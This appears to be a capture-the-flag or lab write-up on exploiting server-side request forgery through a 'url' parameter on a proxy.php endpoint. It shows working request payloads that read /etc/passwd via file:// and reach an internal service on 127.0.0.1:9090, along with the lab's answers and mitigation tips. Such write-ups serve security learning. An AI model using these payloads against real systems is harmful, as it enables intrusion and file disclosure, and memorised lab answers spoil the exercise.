# Advanced SSRF - northstarstudio.hv

## 🎯 Objective
Exploit Server-Side Request Forgery to access internal services and files, demonstrating multi-vector SSRF impact.

## 🔍 Vulnerability Analysis
- **Type:** Server-Side Request Forgery (SSRF)
- **Endpoint:** `GET /proxy.php`
- **Parameter:** `url`
- **Detection:** Unrestricted proxy functionality without internal network restrictions
- **Impact:** Internal service enumeration and sensitive file disclosure

## 💥 Exploitation

### Phase 1: Internal File Disclosure
```http
GET /proxy.php?url=file:///etc/passwd HTTP/1.1
Host: northstarstudio.hv
Result: Retrieved /etc/passwd, identifying last user: beethoven

Phase 2: Internal Service Access
http
GET /proxy.php?url=http://127.0.0.1:9090/ HTTP/1.1
Host: northstarstudio.hv
Result: Accessed internal service on port 9090, revealing hidden word: TheStarryNight

🛡️ Mitigation Strategies
Network-Level Controls: Implement firewall rules to block internal network access

URL Parsing: Use proper URL parsers and validate against SSRF bypass techniques

Response Validation: Analyze and filter responses from internal resources

Authentication Enforcement: Require authentication for proxy functionality

📊 Skills Demonstrated
Multi-Vector Exploitation: Combining file and HTTP protocol SSRF attacks

Internal Network Mapping: Identifying and accessing hidden internal services

Impact Chaining: Connecting multiple SSRF vectors for comprehensive access

Protocol Analysis: Understanding different URL scheme behaviors in SSRF contexts

Conducted in controlled environment for educational purposes
